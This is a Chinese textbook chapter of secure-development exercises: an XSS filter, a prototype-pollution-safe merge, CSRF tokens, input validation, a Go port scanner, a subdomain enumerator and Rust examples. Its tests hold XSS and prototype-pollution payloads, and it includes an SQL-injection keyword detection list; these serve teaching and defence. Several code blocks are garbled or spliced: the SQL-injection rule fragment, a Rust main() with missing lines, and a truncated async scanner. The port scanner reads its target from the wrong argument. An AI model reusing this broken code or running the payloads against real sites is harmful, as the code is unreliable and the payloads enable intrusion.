# 第10章 练习方法——多语言安全开发学习路径

本章提供一套完整的、可执行的多语言安全开发练习体系。不是"建议你学什么"，而是"具体怎么练、练到什么程度、如何验证自己学会了"。整个练习路径按照 JS/TS → Go → Rust → Assembly 的顺序展开，每一阶段都包含明确的目标、完整的代码实现、自检标准和常见陷阱。

## 为什么需要系统化的练习方法

安全开发不同于普通开发——你不仅要写出能跑的代码，还要理解代码在攻击者眼中的样子。很多安全从业者会犯两个极端错误：

1. **只学理论不写代码**：读了十本书，写不出一个端口扫描器。安全是实践驱动的领域，不写代码就无法真正理解漏洞的成因和利用方式。
2. **只Copy-Paste不理解原理**：从GitHub抄了一堆工具，改改参数就用，一旦遇到新场景就束手无策。

系统化练习的核心理念是**螺旋上升**：同一类问题在不同语言、不同抽象层次上反复出现，每次加深一层理解。例如"输入验证"这个概念，在JavaScript中是XSS防御，在Rust中是类型系统强制保证，在Assembly中是栈溢出防护——同一个安全原则，四种不同的实现方式。

### 练习的黄金法则

1. **先写后看**：拿到练习题先自己写，写不出来再参考答案。直接看答案的学习效率只有自己写的1/5。
2. **先跑通再优化**：功能正确是第一步，性能和优雅是第二步。
3. **写测试验证**：每个练习都写测试用例，不仅验证功能正确，还要验证安全边界。
4. **记录踩坑**：遇到的每一个bug、每一个编译错误都是学习机会，记录下来建立自己的错误模式库。

#### 练习1：实现XSS过滤器

XSS（跨站脚本攻击）是Web安全中最常见的漏洞。过滤器的核心挑战在于：攻击者的输入千变万化，简单的黑名单过滤几乎不可能覆盖所有绕过方式。

```javascript
/**
 * XSS过滤器 - 分层防御策略
 * 
 * 核心原则：白名单优于黑名单，编码优于过滤
 * 
 * 防御层次：
 * 1. HTML实体编码（最基础）
 * 2. 属性值编码（防止属性逃逸）
 * 3. URL协议白名单（防止javascript:协议）
 * 4. CSS表达式过滤（防止CSS注入）
 * 5. 事件处理器过滤（防止on*事件）
 */

// 第一层：HTML实体编码
function htmlEntityEncode(str) {
    const entityMap = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;',
        '`': '&#96;'
    };
    return str.replace(/[&<>"'\/`]/g, char => entityMap[char]);
}

// 第二层：完整的XSS过滤器
class XSSFilter {
    constructor(options = {}) {
        // 白名单标签和属性（允许的安全HTML）
        this.allowedTags = options.allowedTags || [
            'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code', 'pre'
        ];
        this.allowedAttributes = options.allowedAttributes || {
            'a': ['href', 'title'],
            'img': ['src', 'alt', 'width', 'height']
        };
        // 危险的URL协议
        this.dangerousProtocols = ['javascript', 'data', 'vbscript', 'file'];
    }

    // 主过滤入口
    filter(input) {
        if (typeof input !== 'string') return '';
        
        // Step 1: 移除所有HTML注释（注释中可能藏有恶意代码）
        let result = input.replace(/<!--[\s\S]*?-->/g, '');
        
        // Step 2: 处理所有标签
        result = result.replace(/<\/?([a-zA-Z][a-zA-Z0-9]*)\b[^>]*>/gi, 
            (match, tagName) => {
                const tag = tagName.toLowerCase();
                if (!this.allowedTags.includes(tag)) {
                    return ''; // 非白名单标签直接移除
                }
                return this.sanitizeTag(match, tag);
            }
        );
        
        return result;
    }

    // 清理单个标签
    sanitizeTag(htmlTag, tagName) {
        // 提取标签属性
        const attrs = this.extractAttributes(htmlTag);
        const safeAttrs = [];

        for (const [name, value] of attrs) {
            const attrName = name.toLowerCase();
            
            // 检查属性是否在白名单中
            const allowed = this.allowedAttributes[tagName] || [];
            if (!allowed.includes(attrName)) continue;
            
            // 特殊处理href/src属性
            if (['href', 'src', 'action'].includes(attrName)) {
                if (this.isSafeURL(value)) {
                    safeAttrs.push(`${attrName}="${htmlEntityEncode(value)}"`);
                }
                continue;
            }
            
            // 过滤on*事件处理器
            if (attrName.startsWith('on')) continue;
            
            // 过滤style属性中的expression
            if (attrName === 'style') {
                const cleaned = value.replace(/expression\s*\(/gi, '');
                safeAttrs.push(`${attrName}="${htmlEntityEncode(cleaned)}"`);
                continue;
            }
            
            safeAttrs.push(`${attrName}="${htmlEntityEncode(value)}"`);
        }

        if (htmlTag.includes('</')) {
            return `</${tagName}>`;
        }
        return `<${tagName}${safeAttrs.length ? ' ' + safeAttrs.join(' ') : ''}>`;
    }

    // URL安全性检查
    isSafeURL(url) {
        if (!url) return false;
        const trimmed = url.trim().toLowerCase();
        // 去除空白和编码绕过
        const decoded = decodeURIComponent(trimmed).replace(/[\s\x00-\x1f]+/g, '');
        for (const proto of this.dangerousProtocols) {
            if (decoded.startsWith(proto + ':')) return false;
        }
        return true;
    }

    // 提取标签属性
    extractAttributes(tagString) {
        const attrs = [];
        // 匹配 name="value" 或 name='value' 或 name=value
        const regex = /([a-zA-Z_][\w-]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+))/g;
        let match;
        while ((match = regex.exec(tagString)) !== null) {
            attrs.push([match[1], match[2] ?? match[3] ?? match[4] ?? '']);
        }
        return attrs;
    }
}

// 测试用例
function testXSSFilter() {
    const filter = new XSSFilter();
    
    const testCases = [
        // [输入, 应该被过滤的关键特征]
        ['<script>alert(1)</script>', 'script标签被移除'],
        ['<img src=x onerror=alert(1)>', 'onerror被移除'],
        ['<a href="javascript:alert(1)">click</a>', 'javascript:协议被阻止'],
        ['<div style="background:url(javascript:alert(1))">', 'javascript:协议被阻止'],
        ['"><script>alert(document.cookie)</script>', 'script标签被移除'],
        ['<svg onload=alert(1)>', 'svg标签被移除（非白名单）'],
        ['<img src="data:text/html,<script>alert(1)</script>">', 'data:协议被阻止'],
    ];
    
    let passed = 0;
    for (const [input, desc] of testCases) {
        const result = filter.filter(input);
        const hasScript = result.toLowerCase().includes('script');
        const hasOnerror = result.toLowerCase().includes('onerror');
        const hasJS = result.toLowerCase().includes('javascript:');
        
        if (!hasScript && !hasOnerror && !hasJS) {
            console.log(`✅ PASS: ${desc}`);
            passed++;
        } else {
            console.log(`❌ FAIL: ${desc}\n   输入: ${input}\n   输出: ${result}`);
        }
    }
    console.log(`\n结果: ${passed}/${testCases.length} 通过`);
}

testXSSFilter();
```

**为什么这样设计：**

- **白名单机制**而非黑名单：黑名单永远列不完攻击者的变形方式（`<scr<script>ipt>`绕过去掉`<script>`的过滤器），白名单只允许已知安全的标签。
- **多层防御**：即使某一层被绕过，其他层仍然有效。这是纵深防御思想的具体体现。
- **编码而非删除**：对非白名单内容做HTML实体编码而非直接删除，避免破坏用户输入的语义（例如用户想显示`<script>`这个字符串本身）。

**自检标准：** 能解释以下5种XSS绕过技术的原理，并说明自己的过滤器如何防御：
1. 双重编码绕过（`%253Cscript%253E`）
2. 事件处理器注入（`onerror`, `onload`, `onfocus`）
3. 协议注入（`javascript:`, `data:text/html`）
4. SVG/MathML向量（`<svg onload=alert(1)>`）
5. CSS表达式（`style="expression(alert(1))"`）

#### 练习2：实现安全的深合并（防止原型链污染）

原型链污染是JavaScript特有的安全漏洞，源于JS的原型继承机制。当攻击者能控制合并操作的源对象时，可以通过设置`__proto__`属性污染所有对象的原型。

```javascript
/**
 * 安全的深合并实现
 * 
 * 原型链污染原理：
 * 
 *   const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
 *   const user = {};
 *   merge(user, malicious);
 *   // 此时 {}.isAdmin === true，所有对象都被污染了
 * 
 * 根本原因：__proto__ 是特殊属性，设置它会影响对象的原型链。
 * 防御方案：在合并时检测并跳过 __proto__、constructor、prototype。
 */

function safeDeepMerge(target, source) {
    if (source === null || typeof source !== 'object') return target;
    if (target === null || typeof target !== 'object') target = {};
    
    // 危险属性列表
    const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
    
    for (const key of Object.keys(source)) {
        // 核心防御：跳过危险属性
        if (DANGEROUS_KEYS.has(key)) {
            console.warn(`[安全] 跳过危险属性: ${key}`);
            continue;
        }
        
        // 额外防御：跳过属性名为对象的键（Symbol攻击）
        if (typeof key !== 'string') continue;
        
        const sourceVal = source[key];
        const targetVal = target[key];
        
        if (sourceVal && typeof sourceVal === 'object' && !Array.isArray(sourceVal)) {
            // 递归合并对象
            target[key] = safeDeepMerge(
                (targetVal && typeof targetVal === 'object') ? targetVal : {},
                sourceVal
            );
        } else {
            // 基本类型和数组直接赋值
            target[key] = sourceVal;
        }
    }
    
    return target;
}

// 安全版本的JSON.parse（使用 reviver 函数过滤危险键）
function safeJSONParse(jsonString) {
    return JSON.parse(jsonString, (key, value) => {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            return undefined; // 解析阶段就过滤
        }
        return value;
    });
}

// 测试
function testPrototypePollution() {
    console.log('--- 原型链污染测试 ---');
    
    // 测试1：基本污染防护
    const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
    const user = { name: 'test' };
    safeDeepMerge(user, malicious);
    console.log('user.isAdmin:', user.isAdmin); // undefined ✅
    console.log('({}).isAdmin:', ({}).isAdmin); // undefined ✅
    
    // 测试2：constructor污染
    const malicious2 = {
        constructor: {
            prototype: { isAdmin: true }
        }
    };
    const user2 = { name: 'test2' };
    safeDeepMerge(user2, malicious2);
    console.log('({}).isAdmin:', ({}).isAdmin); // undefined ✅
    
    // 测试3：正常合并不受影响
    const normal = { a: 1, b: { c: 2, d: 3 } };
    const extra = { b: { e: 4 }, f: 5 };
    const merged = safeDeepMerge(normal, extra);
    console.log('merged:', JSON.stringify(merged)); // {a:1,b:{c:2,d:3,e:4},f:5} ✅
}

testPrototypePollution();
```

**常见陷阱：**

1. **只检查第一层**：有些实现只在顶层检查`__proto__`，但嵌套对象中的`__proto__`仍然危险。
2. **使用`hasOwnProperty`不够**：`key in obj`会检查原型链，`Object.keys()`只返回自有属性，更安全。
3. **JSON.parse的reviver是第一道防线**：在解析阶段就过滤，比在合并阶段过滤更安全。

#### 练习3：实现CSRF Token生成和验证

CSRF（跨站请求伪造）利用浏览器自动附带Cookie的特性，让用户在不知情的情况下发起恶意请求。

```javascript
const crypto = require('crypto');

/**
 * CSRF Token防护系统
 * 
 * 攻击原理：
 * 1. 用户登录银行网站，浏览器保存了Cookie
 * 2. 用户访问恶意网站，恶意网站的JS发起对银行的请求
 * 3. 浏览器自动附带银行的Cookie，银行认为是合法请求
 * 
 * 防御原理：
 * - 服务端生成一个随机Token，存入Session
 * - 前端表单包含这个Token（隐藏字段或Header）
 * - 服务端验证Token是否匹配
 * - 攻击者无法获取这个Token（同源策略保护）
 */

class CSRFProtection {
    constructor() {
        this.tokenStore = new Map(); // 实际项目中用Redis/Session
    }

    /**
     * 生成CSRF Token
     * 使用crypto.randomBytes而非Math.random()
     * Math.random()的输出可预测，不适合安全场景
     */
    generateToken(sessionId) {
        // 32字节 = 256位的随机数，暴力破解不可行
        const token = crypto.randomBytes(32).toString('hex');
        // Token绑定Session，防止Token被跨Session使用
        const hash = crypto.createHmac('sha256', sessionId)
            .update(token)
            .digest('hex');
        
        this.tokenStore.set(sessionId, {
            token: hash,
            createdAt: Date.now(),
            used: false
        });
        
        return token;
    }

    /**
     * 验证CSRF Token
     * 使用时间安全的比较（constant-time comparison）
     * 普通的 === 比较会因为短路求值泄露Token长度信息
     */
    validateToken(sessionId, submittedToken) {
        const stored = this.tokenStore.get(sessionId);
        if (!stored) return false;
        
        // Token过期检查（默认1小时）
        if (Date.now() - stored.createdAt > 3600000) {
            this.tokenStore.delete(sessionId);
            return false;
        }
        
        // 重新计算HMAC进行比较
        const expectedHash = crypto.createHmac('sha256', sessionId)
            .update(submittedToken)
            .digest('hex');
        
        // crypto.timingSafeEqual：恒定时间比较
        // 无论Token前几个字节是否匹配，比较时间都相同
        // 防止攻击者通过计时攻击逐字节猜出Token
        try {
            return crypto.timingSafeEqual(
                Buffer.from(expectedHash, 'hex'),
                Buffer.from(stored.token, 'hex')
            );
        } catch {
            return false;
        }
    }

    // 一次性Token（使用后立即失效，适合表单提交）
    validateAndConsumeToken(sessionId, submittedToken) {
        if (this.validateToken(sessionId, submittedToken)) {
            this.tokenStore.delete(sessionId); // 消费掉
            return true;
        }
        return false;
    }
}

// Express中间件示例
function csrfMiddleware(req, res, next) {
    const csrf = new CSRFProtection();
    const sessionId = req.session.id;
    
    // GET请求：生成Token注入到响应中
    if (req.method === 'GET') {
        const token = csrf.generateToken(sessionId);
        res.locals.csrfToken = token;
        // 也可以设置到Cookie（配合前端JS读取）
        res.cookie('csrf-token', token, { 
            httpOnly: false, // 前端JS需要读取
            sameSite: 'Strict' 
        });
        return next();
    }
    
    // POST/PUT/DELETE请求：验证Token
    const submittedToken = req.body._csrf || req.headers['x-csrf-token'];
    if (!submittedToken || !csrf.validateToken(sessionId, submittedToken)) {
        return res.status(403).json({ error: 'CSRF token验证失败' });
    }
    
    next();
}
```

**关键知识点：**

- **为什么用`crypto.randomBytes`而不是`Math.random()`？** `Math.random()`基于伪随机数生成器（PRNG），其内部状态可能被推算出来。`crypto.randomBytes`调用操作系统的熵源（`/dev/urandom`），密码学安全。
- **为什么用恒定时间比较？** 普通字符串比较在第一个不匹配的字节处就会返回，攻击者通过精确测量响应时间可以逐字节猜出Token。
- **为什么绑定Session？** 如果Token不绑定Session，攻击者可以自己生成Token然后注入到受害者的请求中。

#### 练习4：使用Zod实现API输入验证

```typescript
import { z } from 'zod';

/**
 * Zod验证schema
 * 
 * 核心思想：运行时验证 + 编译期类型推断 = 双重保护
 * 
 * Zod的优势：
 * 1. schema既是验证规则又是TypeScript类型来源
 * 2. 验证失败时返回详细的错误信息（字段级）
 * 3. 可以组合、继承、扩展
 */

// 用户注册schema
const UserRegistrationSchema = z.object({
    username: z.string()
        .min(3, '用户名至少3个字符')
        .max(20, '用户名最多20个字符')
        .regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母、数字和下划线')
        .refine(val => !val.startsWith('_'), '用户名不能以下划线开头'),
    
    email: z.string()
        .email('邮箱格式无效')
        .max(254, '邮箱长度超过RFC限制')
        .toLowerCase(), // 自动规范化
    
    password: z.string()
        .min(8, '密码至少8个字符')
        .max(128, '密码最多128个字符（防止DoS）')
        .regex(/[A-Z]/, '密码必须包含大写字母')
        .regex(/[a-z]/, '密码必须包含小写字母')
        .regex(/[0-9]/, '密码必须包含数字')
        .refine(val => {
            // 检查常见弱密码
            const weakPasswords = ['Password123', 'Qwerty123', 'Admin123'];
            return !weakPasswords.includes(val);
        }, '该密码太常见，请选择更安全的密码'),
    
    age: z.number()
        .int('年龄必须是整数')
        .min(0, '年龄不能为负')
        .max(150, '年龄不合理')
        .optional(),
    
    // 防止批量注册：honeypot字段（前端隐藏，机器人可能填写）
    website: z.string().max(0, '此字段应为空').optional()
});

// 从schema自动推导TypeScript类型
type UserRegistration = z.infer<typeof UserRegistrationSchema>;

// Express中间件
function validateBody<T extends z.ZodType>(schema: T) {
    return (req: any, res: any, next: any) => {
        const result = schema.safeParse(req.body);
        if (!result.success) {
            // 返回详细的字段级错误
            const errors = result.error.issues.map(issue => ({
                field: issue.path.join('.'),
                message: issue.message,
                code: issue.code
            }));
            return res.status(400).json({ 
                error: '输入验证失败', 
                details: errors 
            });
        }
        // 验证通过，将解析后的数据挂载到req
        req.validated = result.data;
        next();
    };
}
```

#### 练习5：实现类型安全的事件系统

```typescript
/**
 * 类型安全的事件系统
 * 
 * 普通事件系统的问题：
 * - 事件名是字符串，拼错了编译器不会报错
 * - payload类型无法约束，运行时才发现类型错误
 * 
 * 解决方案：用泛型和映射类型在编译期约束事件名和payload的对应关系
 */

// 事件映射接口：定义每个事件名对应的payload类型
interface EventMap {
    'user:login': { userId: string; ip: string; timestamp: number };
    'user:logout': { userId: string };
    'alert:intrusion': { type: string; severity: 'low' | 'medium' | 'high' | 'critical'; source: string };
    'scan:complete': { target: string; findings: Array<{ vuln: string; severity: string }> };
}

class TypedEventEmitter<Events extends Record<string, any>> {
    private listeners: {
        [K in keyof Events]?: Array<(payload: Events[K]) => void>
    } = {};

    // 事件名和payload类型自动关联
    on<K extends keyof Events>(event: K, listener: (payload: Events[K]) => void): void {
        if (!this.listeners[event]) {
            this.listeners[event] = [];
        }
        this.listeners[event]!.push(listener);
    }

    emit<K extends keyof Events>(event: K, payload: Events[K]): void {
        const handlers = this.listeners[event];
        if (handlers) {
            handlers.forEach(handler => handler(payload));
        }
    }

    off<K extends keyof Events>(event: K, listener: (payload: Events[K]) => void): void {
        const handlers = this.listeners[event];
        if (handlers) {
            this.listeners[event] = handlers.filter(h => h !== listener) as any;
        }
    }
}

// 使用
const events = new TypedEventEmitter<EventMap>();

// ✅ 正确：类型完全匹配
events.on('user:login', (payload) => {
    console.log(`${payload.userId} logged in from ${payload.ip}`);
});

// ❌ 编译错误：事件名拼写错误
// events.on('user:logn', (payload) => {});

// ❌ 编译错误：缺少severity字段
// events.emit('alert:intrusion', { type: 'xss', source: 'input' });

// ✅ 正确
events.emit('alert:intrusion', { 
    type: 'SQL Injection', 
    severity: 'critical', 
    source: 'login-form' 
});
```

#### 练习6：实现类型安全的ORM查询构建器

```typescript
/**
 * 类型安全的查询构建器
 * 
 * 核心思想：让TypeScript在编译期检查字段名是否存在、操作符是否合法、值类型是否匹配
 * 例如：WHERE age > 'abc' 在编译期就报错（age是number，不能和string比较）
 */

// 数据库表的类型定义
interface Tables {
    users: {
        id: number;
        username: string;
        email: string;
        age: number;
        role: 'admin' | 'user' | 'moderator';
        created_at: Date;
    };
    logs: {
        id: number;
        action: string;
        user_id: number;
        ip: string;
        timestamp: Date;
    };
}

// 比较操作符
type ComparisonOp = 'eq' | 'neq' | 'gt' | 'gte' | 'lt' | 'lte' | 'like' | 'in';

// 字段值类型映射
type FieldType<T, K extends keyof T> = T[K];

// 查询条件类型
type WhereCondition<T, K extends keyof T> = {
    op: ComparisonOp;
    value: K extends keyof T ? T[K] : never;
};

class QueryBuilder<T extends Record<string, any>> {
    private tableName: string;
    private conditions: Array<{ field: keyof T; condition: WhereCondition<T, keyof T> }> = [];
    private selectedFields: (keyof T)[] = [];
    private orderField?: keyof T;
    private orderDir: 'ASC' | 'DESC' = 'ASC';
    private limitCount?: number;

    constructor(tableName: string) {
        this.tableName = tableName;
    }

    select<K extends keyof T>(...fields: K[]): this {
        this.selectedFields = fields;
        return this;
    }

    where<K extends keyof T>(field: K, op: ComparisonOp, value: T[K]): this {
        this.conditions.push({ field, condition: { op, value } });
        return this;
    }

    orderBy<K extends keyof T>(field: K, dir: 'ASC' | 'DESC' = 'ASC'): this {
        this.orderField = field;
        this.orderDir = dir;
        return this;
    }

    limit(count: number): this {
        this.limitCount = count;
        return this;
    }

    // 生成参数化查询（防SQL注入的核心）
    build(): { sql: string; params: any[] } {
        const params: any[] = [];
        let paramIdx = 1;
        
        const fields = this.selectedFields.length 
            ? this.selectedFields.join(', ') 
            : '*';
        
        let sql = `SELECT ${fields} FROM ${this.tableName}`;
        
        if (this.conditions.length > 0) {
            const clauses = this.conditions.map(({ field, condition }) => {
                const opMap: Record<ComparisonOp, string> = {
                    eq: '=', neq: '!=', gt: '>', gte: '>=',
                    lt: '<', lte: '<=', like: 'LIKE', in: 'IN'
                };
                params.push(condition.value);
                return `${String(field)} ${opMap[condition.op]} $${paramIdx++}`;
            });
            sql += ` WHERE ${clauses.join(' AND ')}`;
        }
        
        if (this.orderField) {
            sql += ` ORDER BY ${String(this.orderField)} ${this.orderDir}`;
        }
        
        if (this.limitCount) {
            sql += ` LIMIT ${this.limitCount}`;
        }
        
        return { sql, params };
    }
}

// 表工厂
function table<T extends Record<string, any>>(name: string): QueryBuilder<T> {
    return new QueryBuilder<T>(name);
}

// 使用示例
const query = table<Tables['users']>('users')
    .select('id', 'username', 'email')
    .where('age', 'gte', 18)
    .where('role', 'eq', 'admin')
    .orderBy('created_at', 'DESC')
    .limit(10)
    .build();

console.log(query.sql);
// SELECT id, username, email FROM users WHERE age >= $1 AND role = $2 ORDER BY created_at DESC LIMIT 10
console.log(query.params); // [18, 'admin']

// 以下都会编译错误：
// .where('age', 'gte', 'abc')     // 类型错误：age是number
// .where('nonexist', 'eq', 'x')   // 字段不存在
// .where('role', 'eq', 'invalid') // 值不在联合类型中
```

#### 练习1：实现TCP端口扫描器

端口扫描是安全评估的第一步。这个练习不只是"用Go连接端口"，而是理解并发模型、超时控制、资源管理。

```go
package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// PortResult 存储扫描结果
type PortResult struct {
	Port   int
	State  string // "open", "closed", "filtered"
	Banner string
}

// PortScanner 端口扫描器
type PortScanner struct {
	Target      string
	Timeout     time.Duration
	Workers     int
	BannerGrab  bool
}

// NewPortScanner 创建扫描器实例
func NewPortScanner(target string, workers int) *PortScanner {
	return &PortScanner{
		Target:     target,
		Timeout:    2 * time.Second,
		Workers:    workers,
		BannerGrab: true,
	}
}

// Scan 扫描指定端口范围
func (ps *PortScanner) Scan(ctx context.Context, startPort, endPort int) []PortResult {
	ports := make(chan int, ps.Workers*2)
	results := make(chan PortResult, endPort-startPort+1)
	
	var wg sync.WaitGroup
	
	// 启动Worker池
	for i := 0; i < ps.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for port := range ports {
				select {
				case <-ctx.Done():
					return
				default:
					result := ps.scanPort(ctx, port)
					results <- result
				}
			}
		}()
	}
	
	// 生产端口
	go func() {
		for port := startPort; port <= endPort; port++ {
			select {
			case <-ctx.Done():
				break
			case ports <- port:
			}
		}
		close(ports)
	}()
	
	// 等待所有Worker完成
	go func() {
		wg.Wait()
		close(results)
	}()
	
	// 收集结果
	var openPorts []PortResult
	for result := range results {
		if result.State == "open" {
			openPorts = append(openPorts, result)
		}
	}
	
	// 按端口号排序
	sort.Slice(openPorts, func(i, j int) bool {
		return openPorts[i].Port < openPorts[j].Port
	})
	
	return openPorts
}

// scanPort 扫描单个端口
func (ps *PortScanner) scanPort(ctx context.Context, port int) PortResult {
	addr := fmt.Sprintf("%s:%d", ps.Target, port)
	
	dialer := &net.Dialer{Timeout: ps.Timeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	
	result := PortResult{Port: port}
	
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			result.State = "filtered"
		} else {
			result.State = "closed"
		}
		return result
	}
	defer conn.Close()
	
	result.State = "open"
	
	// 抓取Banner（尝试读取服务欢迎信息）
	if ps.BannerGrab {
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err == nil && n > 0 {
			result.Banner = strings.TrimSpace(string(buf[:n]))
		}
	}
	
	return result
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "用法: %s <target> [start-end] [workers]\n", os.Args[0])
		os.Exit(1)
	}
	
	target := os.Args[0]
	startPort, endPort := 1, 1024
	workers := 100
	
	if len(os.Args) >= 3 {
		parts := strings.Split(os.Args[2], "-")
		if len(parts) == 2 {
			startPort, _ = strconv.Atoi(parts[0])
			endPort, _ = strconv.Atoi(parts[1])
		}
	}
	if len(os.Args) >= 4 {
		workers, _ = strconv.Atoi(os.Args[3])
	}
	
	scanner := NewPortScanner(target, workers)
	
	// 带超时的Context
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	
	fmt.Printf("扫描 %s 端口 %d-%d（%d个并发Worker）...\n", 
		target, startPort, endPort, workers)
	
	start := time.Now()
	results := scanner.Scan(ctx, startPort, endPort)
	elapsed := time.Since(start)
	
	fmt.Printf("\n扫描完成，耗时 %v\n", elapsed)
	fmt.Printf("发现 %d 个开放端口：\n", len(results))
	fmt.Printf("%-8s %-10s %s\n", "PORT", "STATE", "BANNER")
	fmt.Println(strings.Repeat("-", 50))
	for _, r := range results {
		fmt.Printf("%-8d %-10s %s\n", r.Port, r.State, r.Banner)
	}
}
```

**核心学习点：**

1. **Worker池模式**：用固定数量的goroutine消费channel中的任务，避免为每个端口创建一个goroutine（高并发时会耗尽文件描述符）。
2. **Context取消**：扫描过程中按Ctrl+C可以立即停止，不会等到所有Worker超时。
3. **资源管理**：`defer conn.Close()`确保每个连接都被正确关闭，否则会泄漏文件描述符。
4. **错误分类**：区分"closed"（连接被拒绝）和"filtered"（超时无响应），这是Nmap的三态模型。

```go
import (

type ThreatLevel int

const (

func (r *SQLInjectionRule) Name() string { return "SQL注入检测" }
func (r *SQLInjectionRule) Analyze(req *http.Request) *Finding {
	suspiciousPatterns := []string{
		"'", "\"", "or 1=1", "union select", "drop table",
		"--", "/*", "*/", "xp_", "exec(", "execute(",
		"0x", "char(", "concat(", "benchmark(",

		for scanner.Scan() {
			body += scanner.Text()
		}
		body = strings.ToLower(body)
	}
	
	combined := query + " " + body
	for _, pattern := range suspiciousPatterns {
		if strings.Contains(combined, pattern) {
			return &Finding{
				Level:  Dangerous,
				Rule:   r.Name(),
				Detail: fmt.Sprintf("检测到SQL注入特征: '%s'", pattern),
```

```go
package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

type SubdomainResult struct {
	Subdomain string
	IPs       []string
}

func enumerateSubdomains(ctx context.Context, domain string, wordlist string, workers int) ([]SubdomainResult, error) {
	// 读取字典
	file, err := os.Open(wordlist)
	if err != nil {
		return nil, fmt.Errorf("打开字典失败: %w", err)
	}
	defer file.Close()
	
	subdomains := make(chan string, workers*2)
	results := make(chan SubdomainResult, 100)
	
	var wg sync.WaitGroup
	
	// Worker池
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for sub := range subdomains {
				select {
				case <-ctx.Done():
					return
				default:
					fullDomain := fmt.Sprintf("%s.%s", sub, domain)
					ips, err := net.LookupHost(fullDomain)
					if err == nil && len(ips) > 0 {
						results <- SubdomainResult{
							Subdomain: fullDomain,
							IPs:       ips,
						}
					}
				}
			}
		}()
	}
	
	// 读取字典并分发
	go func() {
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			word := scanner.Text()
			if word == "" || word[0] == '#' {
				continue
			}
			select {
			case <-ctx.Done():
				break
			case subdomains <- word:
			}
		}
		close(subdomains)
	}()
	
	// 等待完成
	go func() {
		wg.Wait()
		close(results)
	}()
	
	var found []SubdomainResult
	for r := range results {
		found = append(found, r)
		fmt.Printf("[+] %s -> %v\n", r.Subdomain, r.IPs)
	}
	
	return found, nil
}
```

#### 练习1：实现安全的缓冲区

```rust
use std::io::{self, Write};

/// SafeBuffer - 一个内存安全的字节缓冲区
/// 
/// C语言中，缓冲区溢出是最常见的安全漏洞之一。
/// Rust的所有权系统在编译期就防止了：
/// - 越界访问（Vec的边界检查）
/// - 使用已释放的内存（所有权转移）
/// - 多个指针同时可变引用（借用规则）
/// - 数据竞争（Send/Sync trait）
#[derive(Debug)]
struct SafeBuffer {
    data: Vec<u8>,
    capacity: usize,
}

#[derive(Debug)]
enum BufferError {
    Overflow { requested: usize, available: usize },
    OutOfBounds { offset: usize, len: usize, size: usize },
}

impl std::fmt::Display for BufferError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            BufferError::Overflow { requested, available } =>
                write!(f, "缓冲区溢出: 需要{}字节，剩余{}字节", requested, available),
            BufferError::OutOfBounds { offset, len, size } =>
                write!(f, "越界访问: offset={} len={} size={}", offset, len, size),
        }
    }
}

impl SafeBuffer {
    fn new(capacity: usize) -> Self {
        SafeBuffer {
            data: Vec::with_capacity(capacity),
            capacity,
        }
    }

    /// 写入数据 - 自动检查容量
    fn write(&mut self, data: &[u8]) -> Result<(), BufferError> {
        if self.data.len() + data.len() > self.capacity {
            return Err(BufferError::Overflow {
                requested: data.len(),
                available: self.capacity - self.data.len(),
            });
        }
        self.data.extend_from_slice(data);
        Ok(())
    }

    /// 读取数据 - 自动检查边界
    fn read(&self, offset: usize, len: usize) -> Result<&[u8], BufferError> {
        if offset + len > self.data.len() {
            return Err(BufferError::OutOfBounds {
                offset,
                len,
                size: self.data.len(),
            });
        }
        Ok(&self.data[offset..offset + len])
    }

    /// 安全清空
    fn clear(&mut self) {
        // 安全清零：防止内存中残留敏感数据
        for byte in &mut self.data {
            unsafe { std::ptr::write_volatile(byte, 0) };
        }
        self.data.clear();
    }

    fn len(&self) -> usize {
        self.data.len()
    }

    fn remaining(&self) -> usize {
        self.capacity - self.data.len()
    }
}

// Drop trait：确保缓冲区被释放时清零
impl Drop for SafeBuffer {
    fn drop(&mut self) {
        self.clear();
    }
}

fn main() {
    let mut buf = SafeBuffer::new(1024);
    
    // 正常写入
    buf.write(b"Hello, Security!").unwrap();
    println!("写入后: {}字节, 剩余: {}字节", buf.len(), buf.remaining());
    
    // 正常读取
    let data = buf.read(0, 5).unwrap();
    println!("读取: {:?}", String::from_utf8_lossy(data));
    
    // 越界读取（编译期无法完全防止，但运行时会检查）

        Ok(_) => panic!("不应该成功"),
        Err(e) => println!("预期的错误: {}", e),
    }
    
    // 溢出写入
    let big_data = vec![0u8; 2000];
    match buf.write(&big_data) {

    }
```

```rust
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use std::sync::Arc;

/// Rust异步端口扫描器
/// 
/// 与Go版本对比学习：
/// - Go: goroutine + channel（轻量级线程）
/// - Rust: async/await + tokio（基于epoll的事件驱动）
/// 
/// Rust的优势：
/// - 内存占用更低（无goroutine栈开销）
/// - 编译期保证无数据竞争
/// - 更细粒度的并发控制

#[derive(Debug)]
struct ScanResult {
    port: u16,
    open: bool,
}

async fn scan_port(addr: SocketAddr, timeout: Duration) -> ScanResult {
    let result = tokio::time::timeout(timeout, TcpStream::connect(addr)).await;
    
    ScanResult {
        port: addr.port(),
        open: matches!(result, Ok(Ok(_))),
    }
}

async fn scan_range(
    target: &str,
